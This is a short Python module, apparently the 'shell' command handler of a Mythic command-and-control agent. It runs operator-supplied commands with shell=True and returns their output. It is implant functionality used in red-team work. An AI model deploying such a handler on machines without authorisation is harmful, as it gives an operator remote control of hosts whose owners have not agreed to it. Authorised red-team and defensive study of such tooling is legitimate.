import subprocess
import json
import platform
from typing import Dict

def shell(task: Dict) -> Dict:
    """Execute shell command with cross-platform support"""
    try:
        # Parse parameters from Mythic task
        params = json.loads(task.get("parameters", "{}"))
        command = params.get("command", "")
        
        # Handle macOS backgrounding quirk (preserve original behavior)
        if platform.system() == "Darwin" and command.strip().endswith("&"):
            command += " > /dev/null &"

        # Execute command with safety timeout (60 seconds)
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=60
        )

        # Process output
        output = result.stdout + "\n" + result.stderr
        output = output.replace("\r", "\n").strip()

        if not output:
            output = "No Command Output"

        return {
            "user_output": output,
            "completed": True,
            "status": "success"
        }

    except subprocess.TimeoutExpired:
        return {
            "user_output": "Command timed out after 60 seconds",
            "completed": True,
            "status": "error"
        }
    except Exception as e:
        return {
            "user_output": f"Command failed: {str(e)}",
            "completed": True,
            "status": "error"
        }